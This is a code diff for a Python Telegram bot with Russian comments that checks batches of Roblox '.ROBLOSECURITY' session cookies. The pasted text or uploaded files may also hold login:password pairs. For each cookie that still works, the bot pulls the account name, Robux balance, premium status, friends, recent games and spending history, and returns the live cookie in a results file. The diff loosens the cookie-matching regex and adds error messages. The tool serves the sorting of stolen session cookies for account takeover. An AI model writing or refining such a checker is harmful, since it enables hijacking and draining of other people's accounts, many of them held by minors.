@@ -28,9 +28,12 @@ GAME_DATA = {
 }
 
 def extract_cookie(text):
-    """Вытаскивает куки из строки, даже если там логин:пароль"""
-    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\..+)", text)
-    return match.group(1).strip() if match else None
+    """Улучшенный поиск куки: ищет всё, что начинается на _|WARNING:"""
+    # Ищем куки в любом месте строки, игнорируя лишние пробелы и кавычки
+    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\.[^\"'\s]+)", text)
+    if match:
+        return match.group(1).strip()
+    return None
 
 def get_extra_info(u_id):
     try:
@@ -38,55 +41,40 @@ def get_extra_info(u_id):
         reg_dt = datetime.strptime(u_data['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
         days = (datetime.now() - reg_dt).days
         premium = "Да ✅" if u_data.get('hasPremium', False) else "Нет ❌"
-        
         f_data = requests.get(f"https://friends.roblox.com/v1/users/{u_id}/friends/count").json()
         return reg_dt.strftime("%d.%m.%Y"), days, premium, f_data.get('count', 0)
     except: return "??", 0, "??", 0
 
 def get_recent_places(cookies):
     try:
-        # Мобильный API, который Roblox использует для вкладки Home
+        # Мобильный API для истории (Recent)
         url = "https://games.roblox.com/v2/users/sub-home/content"
+        headers = {"User-Agent": "RobloxApp/5.0 (iPhone; iOS 15.0; Scale/2.0)"}
+        res = requests.get(url, cookies=cookies, headers=headers, timeout=7).json()
         
-        # Имитируем мобильное приложение (очень важно!)
-        headers = {
-            "User-Agent": "RobloxApp/5.0 (iPhone; iOS 15.0; Scale/2.0)",
-            "Accept": "application/json",
-            "Roblox-Place-Id": "0" 
-        }
+        games = []
+        if 'contentItems' in res:
+            for item in res['contentItems']:
+                name = item.get('gameName') or item.get('name')
+                if name: games.append(name)
         
-        res = requests.get(url, cookies=cookies, headers=headers, timeout=7)
-        
-        if res.status_code == 200:
-            data = res.json()
-            games = []
-            # Ищем игры в мобильной структуре ответа
-            if 'contentItems' in data:
-                for item in data['contentItems']:
-                    # Проверяем разные поля, где может лежать название
-                    name = item.get('gameName') or item.get('name') or item.get('title')
-                    if name:
-                        games.append(name)
-            
-            if games:
-                # Убираем дубликаты и берем первые 10
-                unique_games = list(dict.fromkeys(games))
-                return "\n • " + "\n • ".join(unique_games[:10])
+        return "\n • " + "\n • ".join(list(dict.fromkeys(games))[:10]) if games else "Нет недавних заходов"
+    except: return "Скрыто"
 
-        # Если мобильный API не сработал, пробуем запасной эндпоинт для истории
-        alt_url = "https://games.roblox.com/v1/games/list?model.pageContext.sortName=LastPlayed"
-        alt_res = requests.get(alt_url, cookies=cookies, headers=headers, timeout=5).json()
-        alt_games = [g['name'] for g in alt_res.get('games', [])]
-        
-        return "\n • " + "\n • ".join(alt_games[:10]) if alt_games else "Нет истории заходов"
-        
-    except Exception as e:
-        print(f"Ошибка истории: {e}")
-        return "Скрыто настройками"
+def get_game_badges(u_id, universe_id, cookies):
+    try:
+        url = f"https://badges.roblox.com/v1/users/{u_id}/universes/{universe_id}/badges?limit=3"
+        res = requests.get(url, cookies=cookies, timeout=3).json()
+        badges = [b['name'] for b in res.get('data', [])]
+        return " (🏆: " + ", ".join(badges) + ")" if badges else ""
+    except: return ""
 
 def check_cookie(raw_text):
     cookie = extract_cookie(raw_text)
-    if not cookie: return {"status": "error"}
+    if not cookie: 
+        print(f"DEBUG: Куки не найден в строке: {raw_text[:50]}...") # Лог для отладки
+        return {"status": "error"}
+    
     cookies = {".ROBLOSECURITY": cookie}
     headers = {"User-Agent": "Mozilla/5.0"}
     
@@ -96,12 +84,10 @@ def check_cookie(raw_text):
         u = u_req.json()
         u_id, u_name = u['id'], u['name']
         
-        # Инфо
         reg_date, age_days, premium, friends = get_extra_info(u_id)
         robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json().get('robux', 0)
         recent = get_recent_places(cookies)
         
-        # Траты
         sales = requests.get(f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=50", cookies=cookies).json()
         spent_details = {}
         total_spent = 0
@@ -118,13 +104,14 @@ def check_cookie(raw_text):
                     total_spent += amount
 
         details_text = "".join([f" • {n}: {d['sum']} R$ {d['badges']}\n" for n, d in spent_details.items()])
-        
         return {
             "status": "ok", "name": u_name, "id": u_id, "robux": robux, "age": age_days,
             "reg_date": reg_date, "premium": premium, "friends": friends,
             "recent": recent, "details": details_text or "Трат нет\n", "spent": total_spent, "cookie": cookie
         }
-    except: return {"status": "error"}
+    except Exception as e:
+        print(f"DEBUG: Ошибка в check_cookie: {e}")
+        return {"status": "error"}
 
 def format_output(res):
     return (
@@ -141,29 +128,41 @@ def format_output(res):
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message, "👋 Привет! Пришли куки или .txt файл.")
+    bot.reply_to(message, "👋 Чекер активен. Пришли куки текстом или .txt файлом.")
 
 @bot.message_handler(content_types=['text', 'document'])
 def handle(message):
     try:
-        if message.content_type == 'text' and len(message.text) > 100:
+        if message.content_type == 'text':
+            # Чек куки из текста (даже если там мусор)
             res = check_cookie(message.text)
-            if res['status'] == 'ok': bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
+            if res['status'] == 'ok':
+                bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
+            else:
+                bot.send_message(message.chat.id, "❌ Куки невалиден или не найден в тексте.")
+        
         elif message.content_type == 'document':
             file_info = bot.get_file(message.document.file_id)
-            lines = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore').splitlines()
-            bot.send_message(message.chat.id, f"⌛ Чек {len(lines)} строк...")
-            results = [format_output(res) for l in lines if l.strip() and (res := check_cookie(l))['status'] == 'ok']
+            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
+            lines = content.splitlines()
+            
+            bot.send_message(message.chat.id, f"⌛ Начинаю чек {len(lines)} строк...")
+            results = []
+            for l in lines:
+                if l.strip():
+                    res = check_cookie(l)
+                    if res['status'] == 'ok':
+                        results.append(format_output(res))
+            
             if results:
                 buf = io.BytesIO("".join(results).encode('utf-8'))
                 buf.name = "results.txt"
                 bot.send_document(message.chat.id, buf)
-            else: bot.send_message(message.chat.id, "❌ Валид не найден.")
-    except Exception as e: print(e)
+            else:
+                bot.send_message(message.chat.id, "❌ Валидных куки в файле не найдено.")
+    except Exception as e:
+        print(f"Ошибка хендлера: {e}")
 
 if __name__ == '__main__':
     keep_alive()
     bot.infinity_polling()
-
-
-
